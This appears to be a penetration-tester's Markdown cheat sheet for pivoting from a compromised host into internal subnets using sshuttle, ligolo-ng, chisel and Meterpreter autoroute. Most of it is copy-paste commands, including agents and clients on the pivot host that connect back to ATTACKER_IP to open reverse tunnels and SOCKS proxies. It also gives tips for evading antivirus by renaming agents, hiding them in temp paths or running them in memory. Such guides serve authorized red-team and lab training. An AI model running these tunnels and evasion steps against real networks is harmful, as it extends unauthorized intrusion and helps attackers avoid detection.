# Pivoting

**Goal:** fast, stable access to internal subnets with the least moving parts. Use this when a box is live and you need results now.

## Decision Flow
- **Have SSH creds/access to a pivot host?** → Start with **sshuttle** (quick L3-ish route).
- **Need full L3, multi-protocol, and tun interface?** → **ligolo-ng** (agent + proxy).
- **SSH blocked but HTTP/HTTPS allowed?** → **chisel** (reverse SOCKS). Use with proxychains.
- **Already on Meterpreter and it’s stable?** → Use `autoroute` + `socks_proxy` **only then**.

---

## sshuttle - fast poor-man’s VPN
You can `ping`/`nmap`/`rdp` internal targets directly without extra proxies. If routes don’t push, add `--dns` for internal resolution or specify `-x` exclusions.

```bash
# add multiple subnets by repeating the CIDR(s)
sudo sshuttle -r user@PIVOT 10.10.0.0/16 -v

```

---

## ligolo-ng - clean L3 via tun
When you want a real tun interface and stable, multi-protocol traffic (RDP/SMB/LDAP/etc.).

**Attacker (proxy):**

```bash
sudo ./proxy -autocert
# inside ligolo console:
interface_create --name pivot0
```

**Pivot (agent):**

```bash
./agent -connect ATTACKER_IP:11601
```

**Back on attacker (console):**
```text
session            # select the agent
tunnel_start --tun pivot0
# then add routes to the target subnets using your OS route commands
```

**What good looks like:** `ip addr` shows `pivot0` tun; `ip route` includes internal CIDRs; tools work natively.

---

## chisel - reverse SOCKS over HTTP
SSH won’t fly but egress to your host over HTTP[S] is allowed.

**Attacker:**
```bash
./chisel server --reverse -p 1234 --socks5 -v
```

**Pivot:**
```bash
./chisel client -v ATTACKER_IP:1234 R:socks
```

**Usage with proxychains:**
```bash
proxychains -q xfreerdp /v:TARGET:3389
```

SOCKS5 at `127.0.0.1:1080` works for TCP tools through proxychains.

---

## Meterpreter routing (only if you already have it)
Don’t force Meterpreter just for pivoting. If present and stable:

1) Start a `socks_proxy` in msfconsole.

2) Add routes with `post/multi/manage/autoroute`.

3) Run tools via `proxychains`/SOCKS.

4) Prefer native tunnels above when possible for simplicity.

---

## Quick Verification
```bash
# Show glibc/libc on pivot (sanity when dropping agents)
getconf GNU_LIBC_VERSION || true

# Show routes/tun on attacker
ip route | sed -n '1,50p'
ip addr show

# Confirm SOCKS works (for chisel/Meterpreter route)
proxychains -q curl -m 5 http://TARGET:80/ -I
```

---

## Common Obstacles & Fixes (short list)
- **ICMP blocked:** Use TCP `nmap -Pn` and application-layer checks.

- **DNS fails inside tunnel:** Add `--dns` (sshuttle) or set `/etc/resolv.conf` to internal DNS temporarily.

- **RDP/SMB stutter on SOCKS:** Prefer ligolo (L3) over SOCKS for chatty protocols.

- **Agent killed by AV:** Rename agent, place in tmp-paths, or use in-memory where appropriate and allowed.


---

## Cheatsheet (copy/paste)
```bash
# sshuttle quick add
sudo sshuttle -r user@PIVOT 172.16.5.0/23 --dns -v

# ligolo proxy/agent basics
sudo ./proxy -autocert; interface_create --name pivot0
./agent -connect ATTACKER_IP:11601
# route example (Linux host)
sudo ip route add 172.16.5.0/23 dev pivot0

# chisel reverse socks + proxychains
./chisel server --reverse -p 1234 --socks5
./chisel client ATTACKER_IP:1234 R:socks
proxychains -q nmap -sT -Pn -p445 172.16.5.10
```
